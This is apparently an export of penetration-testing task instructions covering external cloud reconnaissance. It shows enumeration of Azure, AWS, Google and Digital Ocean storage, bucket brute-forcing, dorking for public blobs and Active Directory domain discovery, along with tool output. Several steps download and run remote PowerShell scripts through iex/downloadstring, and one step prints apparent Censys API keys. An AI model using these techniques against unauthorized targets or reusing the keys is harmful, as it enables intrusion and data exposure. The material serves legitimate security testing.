                        "taskInstructions": "<h2>Instructions</h2>\nReview the IP spaces associated with their environment and note if CloudFlare is used.\nAlso review the check in the company information category and update this if there is any CloudFlare usage.\n\n<h2>Variation: CloudFail</h2>\n1. Download from https://github.com/m0rtem/CloudFail and follow installation instructions.\n<ncode>git clone https://github.com/m0rtem/CloudFail.git\n</ncode>\n2. Run with the following command.\n<ncode>python3 cloudfail.py --target seo.com\n</ncode>\n<h2>Variation: Automation via CloudFlair</h2>\n1. Download from https://github.com/christophetd/CloudFlair and follow installation instructions.\n<ncode>git clone https://github.com/christophetd/cloudflair.git\n</ncode>\n2. Provide censys API and secret keys.\n<ncode>API ID: 3432d84a-b671-4f41-82dd-6718c08ee6f0\nAPI Secret: sKRhj62qHYv5UZltK9qRmLbmJlvuv1L5\n</ncode>\n3. Run the tool.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Service Used - Azure",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41af700-2af0-11ee-91cc-77bc1e1cb271",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview the IP spaces associated with their environment and note if Azurei is used.\nAlso review the check in the company information category and update this if there is any Azure cloud usage.\n\n<h2>Variation: Enumeration via Get-FederationEndpoint</h2>\n1. Federation / managed test: This shows you if the domain allows for federated authentication. If so, this may be a spot for credential brute-force attacks.\n<ul><li>https://blog.netspi.com/using-powershell-identify-federated-domains/</li>\n</ul>\n<ncode>iex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)\nGet-FederationEndpoint -domain ampf.com \n</ncode>\n2. Consider targeting Azure Portal manually, msonline, or the graphing API. Below is a script for automating checks for a group of domains.\n<ncode>&#35; Import function\niex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;); \n\n&#35; Load\n$domains = gc C:\\temp\\domains.txt\n\n&#35; Check domains\n$results = $domains |\nforeach {\n\t\n Get-FederationEndpoint -domain $_\n}\n\n&#35; Display results\n$results\n\n&#35; Write to file\n$results | export-csv -notypeinformation c:\\temp\\results.csv\n</ncode>\n\n<h2>Variation: Server Enumeration with Invoke-EnumerateAzureSubDomains </h2>\n1. Read the blog below for general usage.\n<ul><li>https://blog.netspi.com/enumerating-azure-services/</li>\n</ul>\n2. Download and load https://github.com/NetSPI/MicroBurst \n3. Run the function below.\nExample:\n<ncode>Invoke-EnumerateAzureSubDomains -Base test12345678 -Verbose\n\nzurewebsites.net\tApp Services\nscm.azurewebsites.net\tApp Services - Management\np.azurewebsites.net\tApp Services\ncloudapp.net\tApp Services\nfile.core.windows.net\tStorage Accounts-Files\nblob.core.windows.net\tStorage Accounts-Blobs\nqueue.core.windows.net\tStorage Accounts-Queues\ntable.core.windows.net\tStorage Accounts-Tables\nredis.cache.windows.net\tDatabases-Redis\ndocuments.azure.com\tDatabases-Cosmos DB\ndatabase.windows.net\tDatabases-MSSQL\nvault.azure.net\tKey Vaults\nonmicrosoft.com\tMicrosoft Hosted Domain\nmail.protection.outlook.com\tEmail\nsharepoint.com\tSharePoint\nazureedge.net\tCDN\nsearch.windows.net\tSearch Appliance\nazure-api.net\tAPI Services\n</ncode>\n\n<h2>Variation: cloud_enum.py</h2>\n1. Download cloud_enum.py from https://github.com/initstring/cloud_enum and follow the installation instructions.\n<ncode>git clone https://github.com/initstring/cloud_enum.git\n</ncode>\n2. Run the following command.\n<ncode>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n<b>[TRUNCATED]</b>\n++++++++++++++++++++++++++\n       azure checks\n++++++++++++++++++++++++++\n\n[+] Checking for Azure Storage Accounts\n[&#42;] Brute-forcing a list of 471 possible DNS names\n    [!] DNS Timeout on bigtablenetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspibilling.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on eventsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspinet.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on opsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspistats.blob.core.windows.net. Investigate if there are many of these.\n  HTTP-OK Storage Account: http://netspi.blob.core.windows.net/\n  HTTP-OK Storage Account: http://netspistorage.blob.core.windows.net/\n\n Elapsed time: 00:00:39\n\n[&#42;] Checking 2 accounts for status before brute-forcing\n[&#42;] Brute-forcing container names in 2 storage accounts\n[&#42;] Brute-forcing 213 container names in netspistorage.blob.core.windows.net\n[&#42;] Brute-forcing 213 container names in netspi.blob.core.windows.net\n\n Elapsed time: 00:00:39\n\n[+] Checking for Azure Websites\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n  Registered Azure Website DNS Name: netspi.azurewebsites.net\n    [!] DNS Timeout on netspi2.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on aenetspi.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-bak.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on club-netspi.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.cluster.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.emails.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.graphite.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspikube.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.mysql.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on production-netspi.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspiproducts.azurewebsites.net. Investigate if there are many of these.\n    [!] DNS Timeout on static-netspi.azurewebsites.net. Investigate if there are many of these.\n  Registered Azure Website DNS Name: netspitest.azurewebsites.net\n  Registered Azure Website DNS Name: netspi-test.azurewebsites.net\n    [!] DNS Timeout on netspi.troposphere.azurewebsites.net. Investigate if there are many of these.\n\n Elapsed time: 00:01:19\n\n[+] Checking for Azure Databases\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n    [!] DNS Timeout on 1.netspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspiamazon.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-beta.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-com.au.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on dbnetspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on endpoints.netspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on gw-netspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspildap.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on packagesnetspi.database.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on shared.netspi.database.windows.net. Investigate if there are many of these.\n  Registered Azure Database DNS Name: netspi-test.database.windows.net\n\n Elapsed time: 00:01:15\n\n[+] Checking for Azure Virtual Machines\n[&#42;] Testing across 1 regions defined in the config file\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n    [!] DNS Timeout on administratornetspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on administrator.netspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on gcp-logs-netspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspipostgres.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspiproducts.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on production-netspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-products.eastus.cloudapp.azure.com. Investigate if there are many of these.\n    [!] DNS Timeout on productsnetspi.eastus.cloudapp.azure.com. Investigate if there are many of these.\n\n Elapsed time: 00:00:54\n<b>[TRUNCATED]</b>\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Service Used - AWS",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41acef6-2af0-11ee-91cb-47870adf6f7d",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview the IP spaces associated with their environment and note if AWS is used.\nAlso review the check in the company information category and update this if there is any AWS cloud usage.\n\n<h2>Variation: cloud_enum.py</h2>\n1. Download cloud_enum.py from https://github.com/initstring/cloud_enum and follow the installation instructions.\n<ncode>git clone https://github.com/initstring/cloud_enum.git\n</ncode>\n2. Run the following command.\n<ncode>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n++++++++++++++++++++++++++\n      amazon checks\n++++++++++++++++++++++++++\n\n[+] Checking for S3 buckets\n  Protected S3 Bucket: http://netspi.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspibackups.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspifiles.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspi-templates.s3.amazonaws.com/\n  Protected S3 Bucket: http://netspitest.s3.amazonaws.com/\n\n Elapsed time: 00:04:06\n\n[+] Checking for AWS Apps\n[&#42;] Brute-forcing a list of 1453 possible DNS names\n    [!] DNS Timeout on 3netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-appspot.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on appspot.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-compute.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on developer.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on es.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi-graphite.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on k8s-netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on mobile-netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on preview-netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on saas.netspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on netspi.splunk.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on tempnetspi.awsapps.com. Investigate if there are many of these.\n    [!] DNS Timeout on websitenetspi.awsapps.com. Investigate if there are many of these.\n  AWS App Found:: https://netspi.awsapps.com\n  AWS App Found:: https://netspi2.awsapps.com\n  AWS App Found:: https://netspi3.awsapps.com\n  AWS App Found:: https://netspitest.awsapps.com\n\n Elapsed time: 00:01:18\n<b>[TRUNCATED]</b>\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud Service Used - Google",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41b1a14-2af0-11ee-91cd-eb71db921894",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview the IP spaces associated with their environment and note if Google Cloud is used.\nAlso review the check in the company information category and update this if there is any Google Cloud usage.\n\n<h2>Variation: cloud_enum.py</h2>\n1. Download cloud_enum.py from https://github.com/initstring/cloud_enum and follow the installation instructions.\n<ncode>git clone https://github.com/initstring/cloud_enum.git\n</ncode>\n2. Run the following command.\n<ncode>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n<b>[TRUNCATED]</b>\n++++++++++++++++++++++++++\n      google checks\n++++++++++++++++++++++++++\n\n[+] Checking for Google buckets\n\n Elapsed time: 00:02:06\n\n[+] Checking for Google Firebase Realtime Databases\n\n Elapsed time: 00:03:58\n\n[+] Checking for Google App Engine apps\n\n Elapsed time: 00:03:01\n\n[+] Checking for project/zones with Google Cloud Functions.\n[&#42;] Testing across 1 regions defined in the config file\n\n Elapsed time: 00:04:27\n\n\n[+] All done, happy hacking!\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Excessive Privileges - Storage Access - Azure Blob",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41b78c4-2af0-11ee-91d1-9795233adc53",
                        "ordinal": 3,
                        "masterFindingId": 17063371,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Identify bucket names by scanning in scope application for references, Google dorking for references, and guessing/permutating names.\n2. Check list permission allow everyone to enumeration files.\n3. Review files for sensitive data.\n\n<h2><b>Variation: Azure Authenticated Users</b></h2>\nUse the Dump-AzureDomainInfo-AzureRM script to review all of the Azure storage accounts. Look at the PublicFileURLs.txt files to review any available public files\n\n<h2><b>Variation: Anonymous Users</b></h2>\nIdentify storage accounts that are in use in the Azure environment. Look for references to any &quot;blob.core.windows.net&quot; subdomains (IE: netspi.blob.core.windows.net). \n\nAttempt to then enumerate valid containers within the storage account. Use Intruder to identify any live folders (IE: https://netspi.blob.core.windows.net/$BURP_Parameter?restype=container). Take the list of enumerated folders and attempt to list out all of the files (add ?restype=container&amp;comp=list to the end of the folder URL)\n\n<h2><b>Variation: MicroBurst</b></h2>\n1. Install MicroBurst from the NetSPI repository.\n<ul><li>https://github.com/NetSPI/MicroBurst</li>\n</ul>\n2. Run the Invoke-EnumerateAzureBlobs command.\nBefore running the script, check the permutations.txt file and add any additional keywords (product/app names, subsidiaries, etc.) that may be applicable to the client. The company's name (or a shortened/common version of it) is typically specified using the -Base parameter, which the tool uses to build the permutations that it checks for.\n\nExample:\n<ncode>PS C:\\Tools&gt; Invoke-EnumerateAzureBlobs -Base netspi -OutputFile output.txt\nFound Storage Account -  netspiazure.blob.core.windows.net\nFound Storage Account -  netspikeys.blob.core.windows.net\nFound Storage Account -  netspistorage.blob.core.windows.net\n\nBing Found Storage Account - optivstorage.blob.core.windows.net\n\nFound Container - netspikeys.blob.core.windows.net/$root\n\tPublic File Available: https://netspikeys.blob.core.windows.net/$root/SuperSecretFile-1.txt\nFound Container - netspistorage.blob.core.windows.net/test\n\tPublic File Available: https://netspistorage.blob.core.windows.net/test/SuperSecretFile.txt\n</ncode>\n3. Review the discovered blobs.\n<ncode>PS C:\\Tools&gt; type .\\output.txt\nnetspiazure.blob.core.windows.net\nnetspikeys.blob.core.windows.net\nnetspistorage.blob.core.windows.net\noptivstorage.blob.core.windows.net\nhttps://netspikeys.blob.core.windows.net/$root/SuperSecretFile-1.txt\nhttps://netspistorage.blob.core.windows.net/test/SuperSecretFile.txt\n</ncode>\nFor any public files, just navigate to the file via the URL listed in the output.\n\n<h2>Variation: cloud_enum.py</h2>\n1. Download cloud_enum.py from https://github.com/initstring/cloud_enum and follow the installation instructions. \n<ncode>git clone https://github.com/initstring/cloud_enum.git\n</ncode>\n2. Run the following command.\n<ncode>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n<b>[TRUNCATED]</b>\n++++++++++++++++++++++++++\n       azure checks\n++++++++++++++++++++++++++\n\n[+] Checking for Azure Storage Accounts\n[&#42;] Brute-forcing a list of 471 possible DNS names\n    [!] DNS Timeout on bigtablenetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspibilling.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on eventsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspinet.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on opsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspistats.blob.core.windows.net. Investigate if there are many of these.\n  HTTP-OK Storage Account: http://netspi.blob.core.windows.net/\n  HTTP-OK Storage Account: http://netspistorage.blob.core.windows.net/\n\n Elapsed time: 00:00:39\n\n[&#42;] Checking 2 accounts for status before brute-forcing\n[&#42;] Brute-forcing container names in 2 storage accounts\n[&#42;] Brute-forcing 213 container names in netspistorage.blob.core.windows.net\n[&#42;] Brute-forcing 213 container names in netspi.blob.core.windows.net\n\n Elapsed time: 00:00:39\n<b>[TRUNCATED]</b>\n</ncode>\n<h2>Variation: Manual</h2>\nGoogle Dork:\n<ncode>site:blob.core.windows.net &quot;CLIENT_NAME&quot;\n</ncode>\nThis search will return any public files that contain CLIENT_NAME. You can then identify the storage account and container from those files.\nAccessing a list of anonymous files from blogs can also be done using the example below:\n<ncode>https://myblob.blob.core.windows.net/?comp=list&amp;timeout=60&amp;maxresults=100\n</ncode>\nFinally you can also review the following source for potential Azure blog usage:\n<ul><li>Github</li>\n<li>Google dorks</li>\n<li>Censius</li>\n<li>Shodan</li>\n</ul>\n<b>Other Azure Services</b>\nAlso, consider running enumeration against other windows.net services in Azure.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Excessive Privileges - Google Cloud - Storage Services",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41b6938-2af0-11ee-91d0-2b921dee1e2b",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nAttempt to identify excessive privileges and sensitive information in Google Cloud storage.\n\n<h2><b>Variation: Manual</b></h2>\n1. Review in-scope websites for referenced google storage pages. \n<ncode>https://console.cloud.google.com/storage/browser/[BUCKET_NAME]\n</ncode>\n2. Attempt to guess spaces that use the company name and related information such as application names, domain names, and active directory domain names.\n\n3. For enumerated spaces attempt to list and access files.\n\n4. If confirm the space exists, but done have access to a file listing then use bing or google to look up other references.\n\n5. Attempt to identify sensitive data.\n\n<h3><b>API Documentation</b></h3>\nhttps://cloud.google.com/storage-transfer/docs/configure-access\nhttps://cloud.google.com/storage/docs/access-public-data\n\n<h2>Variation: cloud_enum.py</h2>\n1. Download cloud_enum.py and follow the installation instructions.\n<ncode>git clone https://github.com/initstring/cloud_enum.git\n</ncode>\n2. Run the following command.\n<ncode>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n<b>[TRUNCATED]</b>\n++++++++++++++++++++++++++\n      google checks\n++++++++++++++++++++++++++\n\n[+] Checking for Google buckets\n\n Elapsed time: 00:02:06\n\n[+] Checking for Google Firebase Realtime Databases\n\n Elapsed time: 00:03:58\n\n[+] Checking for Google App Engine apps\n\n Elapsed time: 00:03:01\n\n[+] Checking for project/zones with Google Cloud Functions.\n[&#42;] Testing across 1 regions defined in the config file\n\n Elapsed time: 00:04:27\n\n\n[+] All done, happy hacking!\n</ncode>\n<h2>Variation: GCPBucketBrute</h2>\n1. Download GCPBucketBrute and follow the installation instructions.\n<ncode>https://github.com/RhinoSecurityLabs/GCPBucketBrute\n</ncode>\n2. Run the tool\n\n<h3><b>Reporting Requirements</b></h3>\nInclude a list of all buckets that provide list permissions to everyone. If sensitive data is found add separate high findings calling out unauthenticated access to sensitive data.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Cloud Service Used - Digital Ocean",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41a77e4-2af0-11ee-91c8-4fdf91bba3c7",
                        "ordinal": 7,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview the IP spaces associated with their environment and note if Digital Ocean is used.\nAlso review the check in the company information category and update this if there is any Digital Ocean usage.\n\n<h2>Variation: Automation via spaces_finder.py</h2>\n1. Download https://github.com/appsecco/spaces-finder.\n<ncode>git clone https://github.com/appsecco/spaces-finder.git\n</ncode>\n2. This can be used to identify usage and enumerate Digital Ocean spaces. run the command below.\n<h3>Example:</h3>\n<ncode>python spaces_finder.py -l domains.txt -g interesting_keywords.txt -D -m 500000 -d 1 -t 5\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Excessive Privileges - Digital Ocean Spaces - List Permission",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41aade0-2af0-11ee-91ca-e72858d00925",
                        "ordinal": 8,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions </b></h2>\n1. Review in-scope websites for referenced Digital Ocean pages. \n2. Attempt to guess spaces that use the company name and related information such as application names, domain names, and active directory domain names.\n3. For enumerated spaces attempt to list and access files.\n4. If confirm the space exists, but done have access to a file listing then use bing or google to look up other references.\n5. Attempt to identify sensitive data.\n\n<h2><b>Tools </b></h2>\nBelow are some tool options, but the API is pretty easy to wrap.\n<ncode>https://github.com/appsecco/spaces-finder/ \nhttps://github.com/jhaddix/domain\nhttps://fubar.nyc3.digitaloceanspaces.com/\nhttps://www.digitalocean.com/community/tutorials/how-to-create-a-digitalocean-space-and-api-key\nhttps://developers.digitalocean.com/documentation/v2/\nhttps://developers.digitalocean.com/documentation/spaces/\n</ncode>\n\n<h2><b>Reporting Requirements</b></h2>\nInclude a list of all buckets that provide list permissions to everyone. If sensitive data is found add separate high findings calling out unauthenticated access to sensitive data.\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Excessive Privileges - Storage Access - AWS S3 Bucket",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41b4a52-2af0-11ee-91ce-cb25087a8bb5",
                        "ordinal": 1,
                        "masterFindingId": 17064031,
                        "taskInstructions": "<h2><b>Instructions </b></h2>\nSee verification instructions.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 9,
                "id": 350456,
                "name": "Information Gathering: ADS Domains",
                "description": "The goal of this task group is to identify Active Directory domains.  This helps  increase the success rate of future dictionary attacks and OSINT tasks.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Upload Active Directory Domain List",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41c80ca-2af0-11ee-91d7-4b173b0a2e75",
                        "ordinal": 7,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Upload a list of the enumerated Active Directory Domains to the Documents section of the Resolve Platform.\n2. Please place contents in a well labeled .csv or .xls document.\n3. When possible include discovery source and full domain name.\n4. Make sure to publish it so it is visible to the client in Track. \n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Information Disclosure - ADS Domain - Certificate Information",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41c3d54-2af0-11ee-91d5-fbb4fca076de",
                        "ordinal": 3,
                        "masterFindingId": 17064791,
                        "taskInstructions": "<h2>Instructions</h2>\nReview crt.sh and scraped SSL certificate host names for potential Active Directory domain names.\n\n<b>Note:</b> Start the review with self-signed certs.\n\n<h2><b>Variation: Automation with Invoke-CTFR-Lookup2</b></h2>\n1. Download and load https://github.com/NetSPI/PowerShell-Private/blob/master/Invoke-CTFR-Lookup2.psm1\n\n2. Run the domain collection and use the -ShowAdDomains flag.\n<ncode>PS C:&gt; <b>$Results = Invoke-CTFR-Lookup2 -Verbose -ShowAdDomains -domain &quot;acme.com&quot; -ADOutputFile c:\\temp\\domains.txt</b>\n\nVERBOSE: Imported 1 domain/keyword targets from command line.\nVERBOSE: Targeting 1 unique domains/keywords.\nVERBOSE: acme.com\nVERBOSE:  - Pulling records from crt.sh\nVERBOSE:  - Cleaning data\nVERBOSE:  - Processing sub domains\nVERBOSE: Checking for potential Active Directory domains.\nVERBOSE: 19 potential Active Directory domains were found.\nVERBOSE: - api.open.acme.com\nVERBOSE: - corp.acme.com\nVERBOSE: - dts.acme.com\nVERBOSE: - eprocurement.acme.com\nVERBOSE: - fhirpoint.open.acme.com\nVERBOSE: - fhirpointdev.open.acme.com\nVERBOSE: - fhirpointstage.open.acme.com\nVERBOSE: - fhirpointtest.open.acme.com\nVERBOSE: - inside.acme.com\nVERBOSE: - insidetest.acme.com\nVERBOSE: - intranet.acme.com\nVERBOSE: - mobility.acme.com\nVERBOSE: - open.acme.com\nVERBOSE: - rd.acme.com\nVERBOSE: - sandbox.open.acme.com\nVERBOSE: - intranet.open.acme.com\nVERBOSE: - im.acme.com\nVERBOSE: - copr.acme.com\nVERBOSE: - corp.acme.com\nVERBOSE: 389 domains found.\nVERBOSE: All done.\n\nPS C:&gt;<b> gc c:\\temp\\domain.txt</b>\n\napi.open.acme.com\ncorp.acme.com\ndts.acme.com\neprocurement.acme.com\nfhirpoint.open.acme.com\nfhirpointdev.open.acme.com\nfhirpointstage.open.acme.com\nfhirpointtest.open.acme.com\ninside.acme.com\ninsidetest.acme.com\nintranet.acme.com\nmobility.acme.com\nopen.acme.com\nrd.acme.com\nsandbox.open.acme.com\nintranet.open.acme.com\nim.acme.com\ncopr.acme.com\ncorp.acme.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Information Disclosure - ADS Domain - Azure Redirect",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41cb112-2af0-11ee-91d8-0b363b090715",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nIt is possible to determine if a particular domain can be used to authenticate to msonline, azure, and office365 using https://login.microsoftonline.com.\n\n<h2>Variation: Manual</h2>\n1.  Visit https://login.microsoftonline.com\n2.  Attempt to login with test@clientdomain.com\n3.  Watch for the redirect, if not redirect to valid login page, then it likely not a supported domain\n\n<h2><b>Variation: Automated using Get-FederationEndpoint </b></h2>\n1. Open PowerShell.\n\n2. Download and import the module.\n<ncode> iex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)\n</ncode>\n3. Run against the target domain to determine if it is federated, managed, or neither. Note the the function does support targeting a domain list from a file.\n<ncode>Get-FederationEndpoint -domain clientdomain.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
